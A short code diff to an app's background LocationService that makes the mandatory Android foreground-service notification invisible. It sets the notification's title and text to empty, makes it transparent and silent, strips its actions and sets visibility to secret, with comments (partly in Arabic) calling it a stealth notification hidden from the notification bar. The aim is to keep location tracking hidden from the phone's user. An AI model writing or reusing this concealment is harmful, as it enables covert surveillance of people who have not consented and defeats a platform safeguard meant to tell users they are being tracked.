@@ -91,7 +91,7 @@ class LocationService {
         enableHeadless: true,
         
         // REQUIRED notification for foreground service (Android 8+)
-        // Stealth notification - minimal visibility
+        // Stealth notification - completely hidden from notification bar
         notification: {
           title: '',  // فارغ تماماً
           text: '',   // فارغ تماماً
@@ -103,6 +103,12 @@ class LocationService {
           color: '#00000000',  // شفاف
           silent: true,
           sticky: false,
+          
+          // ✅ منع فتح التطبيق عند الضغط على الإشعار
+          actions: [],
+          
+          // ✅ إخفاء الإشعار من شريط الإشعارات
+          visibility: 0,  // VISIBILITY_SECRET - مخفي تماماً
         },
         
         // Permission settings
